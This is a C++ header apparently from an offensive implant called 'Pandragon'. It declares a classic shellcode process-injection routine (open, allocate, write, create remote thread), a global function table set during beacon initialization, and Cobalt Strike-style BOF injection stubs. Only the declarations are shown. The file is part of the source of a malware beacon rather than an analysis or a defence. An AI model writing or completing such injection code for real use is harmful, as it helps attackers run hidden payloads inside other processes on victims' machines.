/*
 * Process Injection
 */

#ifndef PANDRAGON_INJECTION_H
#define PANDRAGON_INJECTION_H

#include "resolver.h"
#include <cstdint>

/* ============================================================================
 * Public API
 * ============================================================================ */

/**
 * Classic process injection: open, allocate, write, create remote thread.
 *
 * @param nt             functionTable with resolved APIs
 * @param pid            Target process ID
 * @param shellcode      Pointer to shellcode
 * @param shellcodeSize  Size of shellcode
 * @param outProcess     Optional output: process handle
 * @param outThread      Optional output: thread handle
 * @return TRUE on success
 */
BOOL InjectIntoProcess(functionTable* nt, DWORD pid,
                       const uint8_t* shellcode, SIZE_T shellcodeSize,
                       HANDLE* outProcess = nullptr, HANDLE* outThread = nullptr);

/**
 * Set the global functionTable for injection module.
 * Called during beacon initialization.
 */
void SetInjectionfuncTable(functionTable* nt);

/**
 * Get the global functionTable from injection module.
 * Used by BOF compatibility layer.
 */
functionTable* getFuncTableFromGlobal();

/* ============================================================================
 * BOF Compatibility Stubs (implemented in injection.cpp)
 * ============================================================================ */

extern "C" {
    void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len,
                              int p_offset, char* arg, int a_len);
    void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload,
                                       int p_len, int p_offset, char* arg, int a_len);
}

#endif /* PANDRAGON_INJECTION_H */
